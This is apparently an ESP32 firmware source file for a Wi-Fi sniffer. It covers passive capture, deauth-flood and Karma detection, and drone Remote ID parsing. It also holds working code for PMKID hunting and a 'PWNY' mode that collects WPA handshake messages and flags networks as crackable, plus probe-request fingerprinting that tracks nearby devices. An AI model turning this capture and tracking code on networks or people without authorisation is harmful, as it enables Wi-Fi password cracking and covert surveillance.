

#include "WiFiManager.h"
#include "AntennaManager.h"
#include "MQTTManager.h"
#include "RadioArbiter.h"
#include "SettingsManager.h"
#include "../data/Schema.h"
#include "../core/EventBus.h"
#include "../core/NotifTypes.h"
#include "../core/DebugLog.h"
#include "../core/RuntimeContracts.h"
#include "../config.h"
#include <LittleFS.h>
#include <esp_heap_caps.h>
#include "mbedtls/md5.h"
#include "esp_wifi.h"

WiFiManager WIFI_MGR;

namespace {
AntennaManager s_antennaManager;

bool _ssidHasVisibleChars(const char* ssid) {
    if (!ssid) {
        return false;
    }

    for (const char* p = ssid; *p; ++p) {
        const char c = *p;
        if (c != ' ' && c != '\t' && c != '\r' && c != '\n') {
            return true;
        }
    }

    return false;
}

void _queueWiFiNotification(uint8_t type, const char* text) {
    if (!text || !text[0]) {
        return;
    }

    if (!BUS.publishNotification(type, text)) {
        DLOG_WARN("WIFI", "Notification queue full, dropped type=%u",
                  static_cast<unsigned>(type));
    }
}
}

// ── Known DJI OUIs ───────────────────────────────────────────
static const uint8_t DJI_OUIS[][3] = {
    {0x60,0x60,0x1f}, {0x34,0xd2,0x62}, {0x48,0x1c,0xb9},
    {0xa0,0x14,0x1a}, {0xd8,0xb0,0x53}, {0xc8,0x5a,0xcf},
    {0x40,0x23,0x43}, {0x68,0xda,0x73}, {0x04,0x01,0xe2}
};
static const int DJI_OUI_COUNT = 9;

// ASTM Remote ID OUI
static const uint8_t ASTM_OUI[]        = {0xfa, 0x0b, 0xbc};
static const uint8_t WIFI_ALLIANCE_OUI[]= {0x50, 0x6f, 0x9a};
static const uint8_t NAN_OUI_TYPE      = 0x13;

// ── Stable IE tags for fingerprinting ────────────────────────
// Exclude: SSID(0), DS Param(3), TIM(5), Country(7), RSN(48)
static const uint8_t STABLE_IE_TAGS[] = {
    1, 50, 45, 127, 191, 221
};
static const int STABLE_TAG_COUNT = 6;

// ── Static promiscuous callback ───────────────────────────────
static void _promiscuousCallback(void* buf,
                                  wifi_promiscuous_pkt_type_t type) {
    WIFI_MGR.handleFrame(buf, type);
}

// ═════════════════════════════════════════════════════════════
//  Lifecycle
// ═════════════════════════════════════════════════════════════

void WiFiManager::begin() {
    _networks = (WiFiNetwork*)ps_malloc(
        sizeof(WiFiNetwork) * WIFI_MAX_NETWORKS);
    _devices  = (TrackedDevice*)ps_malloc(
        sizeof(TrackedDevice) * WIFI_MAX_DEVICES);
    _pmkids   = (PMKIDCapture*)ps_malloc(
        sizeof(PMKIDCapture) * WIFI_MAX_PMKIDS);
    _deferredQueue = (DeferredFrame*)ps_malloc(
        sizeof(DeferredFrame) * DEFERRED_QUEUE_SIZE);

    if (!_networks || !_devices ||
        !_pmkids || !_deferredQueue) {
        DLOG_ERROR("WIFI", "PSRAM alloc failed");
        // Free any partial successes so we don't strand PSRAM on a
        // failed init (which usually happens precisely because PSRAM
        // is tight).
        if (_networks)      { free(_networks);      _networks = nullptr; }
        if (_devices)       { free(_devices);       _devices = nullptr; }
        if (_pmkids)        { free(_pmkids);        _pmkids = nullptr; }
        if (_deferredQueue) { free(_deferredQueue); _deferredQueue = nullptr; }
        return;
    }

    memset(_networks, 0,
           sizeof(WiFiNetwork) * WIFI_MAX_NETWORKS);
    memset(_devices,  0,
           sizeof(TrackedDevice) * WIFI_MAX_DEVICES);
    memset(_pmkids,   0,
           sizeof(PMKIDCapture) * WIFI_MAX_PMKIDS);
    memset(_deferredQueue, 0,
           sizeof(DeferredFrame) * DEFERRED_QUEUE_SIZE);
    memset(_graveyard,0, sizeof(_graveyard));
    memset(_channelActivity, 0, sizeof(_channelActivity));
    memset(_recentProbes, 0, sizeof(_recentProbes));

    STATE_WRITE_BEGIN();
    g_state.antennaExternal = WIFI_ANTENNA_DEFAULT_EXTERNAL;
    STATE_WRITE_END();

    s_antennaManager.begin(WIFI_ANTENNA_DEFAULT_EXTERNAL);

    DLOG_INFO("WIFI", "WiFiManager initialized");
}

bool WiFiManager::setExternalAntenna(bool external) {
    if (!s_antennaManager.isAvailable()) {
        return false;
    }

    if (!s_antennaManager.setExternal(external)) {
        return false;
    }

    STATE_WRITE_BEGIN();
    g_state.antennaExternal = external;
    STATE_WRITE_END();

    BUS.publish(EVT_ANTENNA_TOGGLED, external ? 1 : 0);
    return true;
}

void WiFiManager::tick() {
    if (!_deferredQueue || !_networks || !_devices || !_pmkids) return;
    uint32_t now = millis();

    static uint32_t lastQueueLog = 0;
    if (millis() - lastQueueLog > 5000) {
        int depth = (_deferredHead - _deferredTail +
                     DEFERRED_QUEUE_SIZE) % DEFERRED_QUEUE_SIZE;
        uint32_t drops = 0;
        portENTER_CRITICAL(&_deferredStatsMux);
        drops = _deferredDrops;
        portEXIT_CRITICAL(&_deferredStatsMux);
        DLOG_DEBUG("WIFI",
                   "frames=%lu mgmt=%lu probes=%d nets=%d queue=%d drops=%lu",
                   _totalFrames, _mgmtFrames,
                   _probePacketCount, _networkCount,
                   depth, drops);
        lastQueueLog = millis();
    }

    // Process a larger burst during early boot to drain the initial backlog.
    int limit = (millis() < 5000) ? 32 : 8;
    int processed = 0;
    while (_deferredTail != _deferredHead && processed < limit) {
        DeferredFrame& f = _deferredQueue[_deferredTail];

        if (f.frameType == 0) {
            _mgmtFrames++;
            if (f.channel >= 1 && f.channel <= 14)
                _channelActivity[f.channel - 1]++;
            _processManagementFrame(f.payload, f.len,
                                    f.rssi, f.channel);
        } else if (f.frameType == 2) {
            _dataFrames++;
            // Register client from any data frame —
            // not just EAPOL — so we see all associations
            if (f.len >= 22) {
                uint8_t fc1   = f.payload[1];
                bool    toDS  = (fc1 >> 0) & 1;
                bool    fromDS= (fc1 >> 1) & 1;
                const uint8_t* addr1 = f.payload + 4;
                const uint8_t* addr2 = f.payload + 10;
                const uint8_t* addr3 = f.payload + 16;
                if (toDS && !fromDS) {
                    // STA→AP: transmitter=addr2, AP=addr1
                    _registerClientOnNetwork(
                        addr1, addr2, f.rssi);
                } else if (!toDS && fromDS) {
                    // AP→STA: AP=addr2, receiver=addr1
                    _registerClientOnNetwork(
                        addr2, addr1, f.rssi);
                }
                (void)addr3;
            }
            _processEAPOL(f.payload, f.len, f.rssi);
        }

        _deferredTail = (_deferredTail + 1) % DEFERRED_QUEUE_SIZE;
        processed++;
    }

    if (_mode == WIFI_OP_PROMISCUOUS ||
        _mode == WIFI_OP_PMKID ||
        _mode == WIFI_OP_PWNY) {
        if (now - _lastChannelHop >= _channelDwellMs) {
            _hopChannel();
            _lastChannelHop = now;
        }
    }
    if (_mode == WIFI_OP_SCAN) {
        int n = WiFi.scanComplete();
        if (n >= 0) {
            for (int i = 0; i < n &&
                 i < WIFI_MAX_NETWORKS; i++) {
                _findOrCreateNetwork(
                    WiFi.SSID(i).c_str(),
                    WiFi.BSSID(i),
                    WiFi.RSSI(i),
                    WiFi.channel(i));
            }
            WiFi.scanDelete();
            startPromiscuous();
            STATE_WRITE_BEGIN();
            g_state.wifiScanPending = false;
            g_state.dataRefresh     = true;
            STATE_WRITE_END();
        }
    }

    // Periodic behavioral analysis
    if (now - _lastTrendUpdate > 2000) {
        _computeRSSITrends();
        _lastTrendUpdate = now;
    }

    // Social graph update every 10s
    if (now - _lastGraphUpdate > 10000) {
        _updateSocialGraph();
        _lastGraphUpdate = now;
    }

    // Device aging every 30s
    if (now - _lastAgingCheck > AGING_INTERVAL_MS) {
        _ageDevices();
        _lastAgingCheck = now;
    }

    // Deauth flood window reset
    if (_deauthFlood &&
        now - _deauthWindowStart > DEAUTH_WINDOW_MS * 3) {
        _deauthFlood  = false;
        _deauthCount  = 0;
    }
    if (_mode == WIFI_OP_PWNY) {
        _pwnyTick();
    }
    _syncState();
}

// ═════════════════════════════════════════════════════════════
//  Mode control
// ═════════════════════════════════════════════════════════════

bool WiFiManager::startPromiscuous() {
    if (_mode == WIFI_OP_PWNY || _pwnyManualDeauthRequested || _pwnyTargetCount > 0) {
        _mode = WIFI_OP_IDLE;
        _disarmPwny("IDLE");
    }

    if (!_ensureRadioReady()) {
        _mode = WIFI_OP_IDLE;
        _radioReady = false;
        return false;
    }

    if (!_enablePromiscuousCapture("WIFI")) {
        esp_wifi_set_promiscuous(false);
        _mode = WIFI_OP_IDLE;
        _radioReady = false;
        _nextRadioInitAttemptMs = millis() + 5000;
        return false;
    }

    bool promic_on = false;
    esp_wifi_get_promiscuous(&promic_on);
    DLOG_INFO("WIFI", "Promiscuous: %s", promic_on ? "YES" : "NO");

    _mode = WIFI_OP_PROMISCUOUS;
    _channelDwellMs = 200;
    _lastChannelHop = millis();
    _radioReady = true;
    DLOG_INFO("WIFI", "Promiscuous mode started");
    return true;
}

bool WiFiManager::startScan() {
    if (_mode == WIFI_OP_PWNY || _pwnyManualDeauthRequested || _pwnyTargetCount > 0) {
        _mode = WIFI_OP_IDLE;
        _disarmPwny("IDLE");
    }

    if (!_ensureRadioReady()) {
        DLOG_WARN("WIFI", "Failed to ready STA mode for scan");
        return false;
    }

    esp_wifi_set_promiscuous(false);
    _mode = WIFI_OP_SCAN;
    WiFi.scanNetworks(true);  // async
    DLOG_INFO("WIFI", "Scan started");
    return true;
}

void WiFiManager::pauseRadio() {
    esp_wifi_set_promiscuous(false);
    WiFi.scanDelete();
    _mode = WIFI_OP_IDLE;
    _disarmPwny("PAUSED");

    STATE_WRITE_BEGIN();
    g_state.wifiOpMode = _mode;
    STATE_WRITE_END();

    DLOG_INFO("WIFI", "Radio paused");
}

void WiFiManager::stopAll() {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect(true);
    // Yield to the event-loop task so the in-flight disconnect event drains
    // before any subsequent mode change (prevents esp_wifi_stop/mode-change
    // race that can brown the rail).
    vTaskDelay(pdMS_TO_TICKS(150));
    _mode = WIFI_OP_IDLE;
    _disarmPwny("IDLE");
}

void WiFiManager::suspendRadio() {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect(true, true);
    // Yield to the event-loop task so the in-flight disconnect event drains
    // before the WIFI_OFF mode change.
    vTaskDelay(pdMS_TO_TICKS(150));
    WiFi.mode(WIFI_OFF);
    _mode = WIFI_OP_IDLE;
    _radioReady = false;
    _disarmPwny("SUSPENDED");

    STATE_WRITE_BEGIN();
    g_state.wifiConnected = false;
    g_state.wifiSSID[0] = '\0';
    g_state.wifiOpMode = _mode;
    STATE_WRITE_END();

    DLOG_INFO("WIFI", "Radio suspended");
}

bool WiFiManager::startPMKIDHunt(const char* targetBSSID) {
    if (_mode == WIFI_OP_PWNY || _pwnyManualDeauthRequested || _pwnyTargetCount > 0) {
        _mode = WIFI_OP_IDLE;
        _disarmPwny("IDLE");
    }

    if (!_ensureRadioReady()) {
        DLOG_WARN("WIFI", "Failed to ready STA mode for PMKID hunt");
        return false;
    }

    strlcpy(_pmkidTarget, targetBSSID, sizeof(_pmkidTarget));

    // Find target channel
    for (int i = 0; i < _networkCount; i++) {
        char bssidStr[18];
        _macToStr(_networks[i].bssid, bssidStr);
        if (strcmp(bssidStr, targetBSSID) == 0) {
            _pmkidTargetChannel = _networks[i].channel;
            break;
        }
    }

    if (!_enablePromiscuousCapture("WIFI")) {
        _mode = WIFI_OP_IDLE;
        return false;
    }
    _mode = WIFI_OP_PMKID;
    _channelDwellMs = 50;  // faster hop when hunting
    _lastChannelHop = millis();
    DLOG_INFO("WIFI", "PMKID hunt started: %s", targetBSSID);
    return true;
}


bool WiFiManager::_ensureRadioReady() {
    wifi_mode_t currentMode = WIFI_MODE_NULL;
    if (_radioReady &&
        esp_wifi_get_mode(&currentMode) == ESP_OK &&
        currentMode == WIFI_MODE_STA) {
        return true;
    }

    const uint32_t now = millis();
    if (_nextRadioInitAttemptMs != 0 &&
        static_cast<int32_t>(now - _nextRadioInitAttemptMs) < 0) {
        return false;
    }
    _nextRadioInitAttemptMs = now + 1500;

    _radioReady = false;
    WiFi.persistent(false);
    esp_wifi_stop();
    // Yield to the event-loop task so the in-flight disconnect event drains
    // before the WIFI_OFF mode change — esp_wifi_stop() races any queued
    // disconnect callback and can brown the rail if we flip modes too fast.
    vTaskDelay(pdMS_TO_TICKS(150));
    WiFi.mode(WIFI_OFF);
    // Hardware settle between WIFI_OFF and WIFI_STA.
    vTaskDelay(pdMS_TO_TICKS(40));

    const bool modeOk = WiFi.mode(WIFI_STA);
    // Poll for STA mode confirmation rather than a fixed delay — exits as
    // soon as the driver reports WIFI_MODE_STA, with 120ms as a hard ceiling.
    {
        const uint32_t deadline = millis() + 120;
        wifi_mode_t m = WIFI_MODE_NULL;
        do {
            vTaskDelay(pdMS_TO_TICKS(10));
            esp_wifi_get_mode(&m);
        } while (m != WIFI_MODE_STA &&
                 static_cast<int32_t>(millis() - deadline) < 0);
    }

    const esp_err_t setModeErr = esp_wifi_set_mode(WIFI_MODE_STA);
    const esp_err_t startErr = esp_wifi_start();
    const esp_err_t promOffErr = esp_wifi_set_promiscuous(false);
    const esp_err_t countryErr = esp_wifi_set_country_code("US", true);
    const esp_err_t getModeErr = esp_wifi_get_mode(&currentMode);

    const bool startReady = (startErr == ESP_OK || startErr == ESP_ERR_INVALID_STATE);

    _radioReady = modeOk &&
                  setModeErr == ESP_OK &&
                  startReady &&
                  promOffErr == ESP_OK &&
                  getModeErr == ESP_OK &&
                  currentMode == WIFI_MODE_STA;

    if (_radioReady) {
        WiFi.setSleep(false);
        _nextRadioInitAttemptMs = 0;
        return true;
    }

    DLOG_ERROR("WIFI",
               "Radio init failed: modeOk=%d setMode=%s start=%s promOff=%s country=%s getMode=%s current=%d",
               modeOk ? 1 : 0,
               esp_err_to_name(setModeErr),
               esp_err_to_name(startErr),
               esp_err_to_name(promOffErr),
               esp_err_to_name(countryErr),
               esp_err_to_name(getModeErr),
               static_cast<int>(currentMode));
    return false;
}

bool WiFiManager::_enablePromiscuousCapture(const char* tag) {
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                         WIFI_PROMIS_FILTER_MASK_DATA;

    const esp_err_t filterErr =
        esp_wifi_set_promiscuous_filter(&filter);
    const esp_err_t cbErr =
        esp_wifi_set_promiscuous_rx_cb(_promiscuousCallback);
    const esp_err_t promErr = esp_wifi_set_promiscuous(true);

    if (filterErr != ESP_OK || cbErr != ESP_OK || promErr != ESP_OK) {
        DLOG_ERROR(tag,
                   "Promiscuous setup failed: filter=%s cb=%s on=%s",
                   esp_err_to_name(filterErr),
                   esp_err_to_name(cbErr),
                   esp_err_to_name(promErr));
        esp_wifi_set_promiscuous(false);
        return false;
    }

    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    return true;
}

void WiFiManager::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    _channel = ch;
    if (_mode == WIFI_OP_PROMISCUOUS ||
        _mode == WIFI_OP_PMKID ||
        _mode == WIFI_OP_PWNY) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
}

// ═════════════════════════════════════════════════════════════
//  Channel hopping
// ═════════════════════════════════════════════════════════════

void WiFiManager::_hopChannel() {
    if (_mode == WIFI_OP_PMKID && _pmkidTargetChannel > 0) {
        // Stay on target channel during PMKID hunt
        if (_channel != _pmkidTargetChannel) {
            _channel = _pmkidTargetChannel;
            esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
        }
        return;
    }
    _channel = (_channel % 11) + 1;
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
}

// ═════════════════════════════════════════════════════════════
//  Promiscuous frame handler
// ═════════════════════════════════════════════════════════════

void WiFiManager::handleFrame(void* buf,
                              wifi_promiscuous_pkt_type_t type) {
    if (!buf) return;
    if (!_deferredQueue) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int copyLen = pkt->rx_ctrl.sig_len;
    if (copyLen <= 0) return;

    int nextHead = (_deferredHead + 1) % DEFERRED_QUEUE_SIZE;
    if (nextHead == _deferredTail) {
        portENTER_CRITICAL_ISR(&_deferredStatsMux);
        _deferredDrops++;
        portEXIT_CRITICAL_ISR(&_deferredStatsMux);
        return;  // queue full, drop
    }

    DeferredFrame& f = _deferredQueue[_deferredHead];
    if (copyLen > 128) copyLen = 128;
    memcpy(f.payload, pkt->payload, copyLen);
    f.len          = copyLen;
    f.rssi         = pkt->rx_ctrl.rssi;
    f.channel      = pkt->rx_ctrl.channel;
    f.frameType    = (pkt->payload[0] >> 2) & 0x03;
    f.frameSubtype = (pkt->payload[0] >> 4) & 0x0F;

    _deferredHead = nextHead;
    _totalFrames++;
}

void WiFiManager::_processManagementFrame(const uint8_t* p,
                                           int len,
                                           int8_t rssi,
                                           uint8_t ch) {
    if (len < 24) return;
    uint8_t subtype = (p[0] >> 4) & 0x0F;

    switch (subtype) {
        case 4:  _processProbeRequest(p, len, rssi, ch); break;
        case 8:  _processBeacon(p, len, rssi, ch);       break;
        case 13: _processActionFrame(p, len, rssi, ch);  break;
        case 12: {
            // Deauth frame — flood detection
            _deauthCount++;
            uint32_t now = millis();
            if (now - _deauthWindowStart > DEAUTH_WINDOW_MS) {
                _deauthCount = 1;
                _deauthWindowStart = now;
            }
            if (_deauthCount >= DEAUTH_THRESHOLD) {
                _deauthFlood = true;
                _queueWiFiNotification(NOTIF_DEAUTH,
                                       "DEAUTH FLOOD DETECTED");
            }
            break;
        }
        default: break;
    }
}

// ═════════════════════════════════════════════════════════════
//  Probe request processing
// ═════════════════════════════════════════════════════════════

void WiFiManager::_processProbeRequest(const uint8_t* p,
                                        int len,
                                        int8_t rssi,
                                        uint8_t ch) {
    if (len < 24) return;

    // Source MAC is at bytes 10-15
    const uint8_t* srcMAC = p + 10;
    char macStr[18];
    _macToStr(srcMAC, macStr);

    // Tagged parameters start at byte 24
    const uint8_t* tags = p + 24;
    int tagLen = len - 24;

    // Extract SSID from tag 0
    char ssid[33] = "";
    int pos = 0;
    while (pos + 2 <= tagLen) {
        uint8_t tagID  = tags[pos];
        uint8_t tagSz  = tags[pos + 1];
        if (pos + 2 + tagSz > tagLen) break;

        if (tagID == 0 && tagSz > 0 && tagSz <= 32) {
            memcpy(ssid, tags + pos + 2, tagSz);
            ssid[tagSz] = '\0';
        }
        pos += 2 + tagSz;
    }

    // Compute IE fingerprint
    char ieFP[33] = "";
    _computeIEFingerprint(tags, tagLen, ieFP);

    // Skip fingerprinting for whitelisted targets
    const bool targetWhitelisted = _isTrustedSSID(ssid);

    if (!targetWhitelisted) {
        // Find or create device
        TrackedDevice* dev = _findOrCreateDevice(macStr, srcMAC,
                                                  ieFP, rssi);
        if (dev) {
            _addProbedSSID(dev, ssid);
            _updateBehavior(dev);
            _updateRSSIHistory(dev, rssi);
            _classifyVendor(dev, tags, tagLen);
            _checkGraveyard(dev);
            _recordRecentProbe(ssid, srcMAC, rssi);
    // Pwny opportunism — device actively seeking a target SSID
    if (_mode == WIFI_OP_PWNY && ssid[0] != '\0') {
        for (int i = 0; i < _pwnyTargetCount; i++) {
            uint8_t ni = _pwnyTargets[i].networkIdx;
            if (strcmp(_networks[ni].ssid, ssid) == 0 &&
                !_pwnyTargets[i].complete) {
                _pwnyTargets[i].score =
                    min((int16_t)200,
                        (int16_t)(_pwnyTargets[i].score + 30));
                DLOG_INFO("PWNY",
                          "Opportunism: %s score→%d",
                          ssid, _pwnyTargets[i].score);
                break;
            }
        }
    }
        }

        _probePacketCount++;

        // Queue to MQTT
        MQTT_MGR.queueProbe(macStr, ssid[0] ? ssid : nullptr,
                             rssi, ch, ieFP);

        // Update last probe display
        STATE_WRITE_BEGIN();
        strlcpy(g_state.lastProbedSSID, ssid,
                sizeof(g_state.lastProbedSSID));
        strlcpy(g_state.lastProbedMAC, macStr,
                sizeof(g_state.lastProbedMAC));
        g_state.probePacketCount++;
        STATE_WRITE_END();
    }
}

// ═════════════════════════════════════════════════════════════
//  Beacon processing
// ═════════════════════════════════════════════════════════════

void WiFiManager::_processBeacon(const uint8_t* p,
                                  int len,
                                  int8_t rssi,
                                  uint8_t ch) {
    if (len < 36) return;

    // BSSID at bytes 16-21
    const uint8_t* bssid = p + 16;

    // Tagged params start at 36 (24 header + 8 fixed beacon fields + 4 cap)
    const uint8_t* tags = p + 36;
    int tagLen = len - 36;
    if (tagLen < 2) return;

    // Extract SSID
    char ssid[33] = "";
    bool isHidden = false;
    bool hasWPS   = false;

    char security[12] = "OPEN";
    int pos = 0;
    while (pos + 2 <= tagLen) {
        uint8_t tagID = tags[pos];
        uint8_t tagSz = tags[pos + 1];
        if (pos + 2 + tagSz > tagLen) break;

        if (tagID == 0) {
            if (tagSz == 0) {
                isHidden = true;
            } else if (tagSz <= 32) {
                memcpy(ssid, tags + pos + 2, tagSz);
                ssid[tagSz] = '\0';
            }
        } else if (tagID == 48) {
            // RSN IE — WPA2/WPA3
            strlcpy(security, "WPA2", sizeof(security));
        } else if (tagID == 221 && tagSz >= 4) {
            const uint8_t* ie = tags + pos + 2;
            // WPA OUI: 00-50-f2 type 01
            if (ie[0]==0x00 && ie[1]==0x50 &&
                ie[2]==0xf2 && ie[3]==0x01) {
                if (strcmp(security, "WPA2") != 0)
                    strlcpy(security, "WPA", sizeof(security));
            }
            // WPS OUI: 00-50-f2 type 04
            if (ie[0]==0x00 && ie[1]==0x50 &&
                ie[2]==0xf2 && ie[3]==0x04) {
                hasWPS = true;
            }
            // Check for DJI DroneID
            bool isDJI = false;
            for (int d = 0; d < DJI_OUI_COUNT; d++) {
                if (ie[0] == DJI_OUIS[d][0] &&
                    ie[1] == DJI_OUIS[d][1] &&
                    ie[2] == DJI_OUIS[d][2]) {
                    isDJI = true;
                    break;
                }
            }
            if (isDJI) {
                _checkDJIDroneID(ie, tagSz, rssi, ch);
            }
        }
        pos += 2 + tagSz;
    }

    // Check whitelist before processing
    const bool whitelisted = _isTrustedSSID(ssid);
    if (whitelisted) {
        _findOrCreateNetwork(ssid, bssid, rssi, ch);
        return;
    }

    WiFiNetwork* net = _findOrCreateNetwork(ssid, bssid,
                                             rssi, ch);
    if (net) {
        net->isHidden = isHidden;
        net->hasWPS   = hasWPS;
        strlcpy(net->security, security,
                sizeof(net->security));
        net->lastSeen = millis();

        // Check Karma
        _checkKarma(ssid, bssid, rssi,
                    net->firstSeen == millis());
    }
}

// ═════════════════════════════════════════════════════════════
//  Action frame — ASTM Remote ID
// ═════════════════════════════════════════════════════════════

void WiFiManager::_processActionFrame(const uint8_t* p,
                                       int len,
                                       int8_t rssi,
                                       uint8_t ch) {
    if (len < 26) return;
    // Action frame body starts at byte 24
    const uint8_t* body = p + 24;
    int bodyLen = len - 24;
    _checkASTMRemoteID(body, bodyLen, rssi, ch);
}

// ═════════════════════════════════════════════════════════════
//  EAPOL / PMKID
// ═════════════════════════════════════════════════════════════

void WiFiManager::_processEAPOL(const uint8_t* p,
                                  int len,
                                  int8_t rssi) {
    // Data frame: 24 byte header + LLC (8 bytes) + EAPOL
    if (len < 36) return;

    // Check LLC SNAP header for EAPOL ethertype 0x888E
    const uint8_t* llc = p + 24;
    if (llc[0] != 0xAA || llc[1] != 0xAA ||
        llc[2] != 0x03) return;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return;

    // AP MAC = bytes 16-21, Client MAC = bytes 10-15
    const uint8_t* apMAC     = p + 16;
    const uint8_t* clientMAC = p + 10;

    // Register this client as associated with the AP
    _registerClientOnNetwork(apMAC, clientMAC, rssi);

    // Find SSID for this AP
    const char* ssid = _findSSIDByBSSID(apMAC);

    const uint8_t* eapol = p + 32;
    int eapolLen = len - 32;

    // Update pwny target EAPOL mask BEFORE _extractPMKID so that any
    // queuePMKID call downstream sees the mask that includes this frame.
    if (_mode == WIFI_OP_PWNY && eapolLen >= 7) {
        // Determine message number from Key Info field
        uint16_t keyInfo;
        memcpy(&keyInfo, eapol + 5, 2);
        keyInfo = __builtin_bswap16(keyInfo);
        bool keyACK  = (keyInfo >> 7) & 1;
        bool keyMIC  = (keyInfo >> 8) & 1;
        bool install = (keyInfo >> 6) & 1;
        // Msg1: ACK=1 MIC=0  Msg2: ACK=0 MIC=1
        // Msg3: ACK=1 MIC=1 Install=1  Msg4: ACK=0 MIC=1 Install=0
        uint8_t msgNum = 0;
        if ( keyACK && !keyMIC)              msgNum = 1;
        if (!keyACK &&  keyMIC && !install)  msgNum = 2; // could be 4
        if ( keyACK &&  keyMIC &&  install)  msgNum = 3;
        // Distinguish msg2 vs msg4 by replay counter direction
        // Simplified: treat any ACK=0,MIC=1 as msg2 — conservative
        if (msgNum == 2 && !keyACK) msgNum = 2;

        for (int i = 0; i < _pwnyTargetCount; i++) {
            if (!_macsEqual(
                    _networks[_pwnyTargets[i].networkIdx].bssid,
                    apMAC)) continue;

            PwnyTarget& t = _pwnyTargets[i];
            if (msgNum > 0) {
                const uint8_t bit = (1U << (msgNum - 1));
                if ((t.eapolMsgMask & bit) == 0) {
                    t.eapolMsgMask |= bit;
                    const uint8_t nextSeen =
                        static_cast<uint8_t>(t.eapolMsgsSeen + 1);
                    t.eapolMsgsSeen = (nextSeen > 4) ? 4 : nextSeen;
                }
            }
            // Crackable: have msg1+msg2 (RSN-based) or msg2+msg3
            t.crackable = _pwnyIsHandshakeCrackable(t.eapolMsgMask);
            if (t.crackable)
                _networks[t.networkIdx].hasHandshake = true;
            break;
        }
    }

    _extractPMKID(eapol, eapolLen, apMAC, clientMAC,
                  ssid ? ssid : "");
}

// ═════════════════════════════════════════════════════════════
//  IE Fingerprinting
// ═════════════════════════════════════════════════════════════

void WiFiManager::_computeIEFingerprint(const uint8_t* tags,
                                          int len,
                                          char* outHex33) {
    outHex33[0] = '\0';

    mbedtls_md5_context ctx;
    mbedtls_md5_init(&ctx);
    mbedtls_md5_starts(&ctx);

    int pos = 0;
    while (pos + 2 <= len) {
        uint8_t tagID = tags[pos];
        uint8_t tagSz = tags[pos + 1];
        if (pos + 2 + tagSz > len) break;

        // Only hash stable tags
        bool stable = false;
        for (int i = 0; i < STABLE_TAG_COUNT; i++) {
            if (tagID == STABLE_IE_TAGS[i]) {
                stable = true;
                break;
            }
        }

        if (stable) {
            // Hash tag ID + size + data
            mbedtls_md5_update(&ctx, tags + pos,
                               2 + tagSz);
        }
        pos += 2 + tagSz;
    }

    uint8_t hash[16];
    mbedtls_md5_finish(&ctx, hash);
    mbedtls_md5_free(&ctx);

    for (int i = 0; i < 16; i++) {
        snprintf(outHex33 + i*2, 3, "%02x", hash[i]);
    }
    outHex33[32] = '\0';
}

uint32_t WiFiManager::_computeIEOrderHash(const uint8_t* tags,
                                            int len) {
    // FNV-1a hash of the IE tag ID sequence
    uint32_t hash = 0x811c9dc5;
    int pos = 0;
    while (pos + 2 <= len) {
        uint8_t tagID = tags[pos];
        uint8_t tagSz = tags[pos + 1];
        if (pos + 2 + tagSz > len) break;
        hash ^= tagID;
        hash *= 0x01000193;
        pos += 2 + tagSz;
    }
    return hash;
}

// ═════════════════════════════════════════════════════════════
//  ASTM F3411 Remote ID Parser
// ═════════════════════════════════════════════════════════════

bool WiFiManager::_checkASTMRemoteID(const uint8_t* body,
                                       int len,
                                       int8_t rssi,
                                       uint8_t ch) {
    if (len < 7) return false;

    // Public Action frame: category=4, action=9
    if (body[0] != 4 || body[1] != 9) return false;

    const uint8_t* oui = body + 2;

    // Check ASTM OUI fa:0b:bc
    bool isASTM = (oui[0] == ASTM_OUI[0] &&
                   oui[1] == ASTM_OUI[1] &&
                   oui[2] == ASTM_OUI[2]);

    // Check WiFi Alliance OUI 50:6f:9a type 0x13
    bool isNAN = (oui[0] == WIFI_ALLIANCE_OUI[0] &&
                  oui[1] == WIFI_ALLIANCE_OUI[1] &&
                  oui[2] == WIFI_ALLIANCE_OUI[2] &&
                  len > 5 && body[5] == NAN_OUI_TYPE);

    if (!isASTM && !isNAN) return false;

    // Message payload starts after OUI (+ type byte for NAN)
    int msgOffset = isNAN ? 6 : 5;
    const uint8_t* msg = body + msgOffset;
    int msgLen = len - msgOffset;

    if (msgLen < 1) return false;

    _parseRemoteID(msg, msgLen, rssi, ch);
    return true;
}

void WiFiManager::_parseRemoteID(const uint8_t* payload,
                                    int len,
                                    int8_t rssi,
                                    uint8_t channel) {
    if (!payload || len <= 0) return;

    ODID_UAS_Data uasData;
    memset(&uasData, 0, sizeof(uasData));

    // Packed messages are variable length. The OpenDroneID decoder assumes the
    // complete pack buffer exists, so validate the advertised size first.
    if (len >= ODID_MESSAGE_SIZE) {
        uint8_t msgType = (payload[0] >> 4) & 0x0F;
        if (msgType == ODID_MESSAGETYPE_PACKED && len >= 3) {
            const uint8_t singleMessageSize = payload[1];
            const uint8_t packSize = payload[2];
            const uint16_t requiredLen =
                static_cast<uint16_t>(3U) +
                static_cast<uint16_t>(packSize) * ODID_MESSAGE_SIZE;
            if (singleMessageSize == ODID_MESSAGE_SIZE &&
                packSize > 0 &&
                packSize <= ODID_PACK_MAX_MESSAGES &&
                len >= static_cast<int>(requiredLen)) {
                ODID_MessagePack_encoded* pack =
                    (ODID_MessagePack_encoded*)payload;
                if (decodeMessagePack(&uasData, pack) == ODID_SUCCESS) {
                    _handleDecodedDrone(&uasData, rssi, channel);
                    return;
                }
            }
        }

        // Single message decode — check type first.
        switch (msgType) {
            case ODID_MESSAGETYPE_BASIC_ID:
                if (decodeBasicIDMessage(&uasData.BasicID[0],
                    (ODID_BasicID_encoded*)payload) == ODID_SUCCESS) {
                    uasData.BasicIDValid[0] = 1;
                }
                break;
            case ODID_MESSAGETYPE_LOCATION:
                if (decodeLocationMessage(&uasData.Location,
                    (ODID_Location_encoded*)payload) == ODID_SUCCESS) {
                    uasData.LocationValid = 1;
                }
                break;
            case ODID_MESSAGETYPE_SYSTEM:
                if (decodeSystemMessage(&uasData.System,
                    (ODID_System_encoded*)payload) == ODID_SUCCESS) {
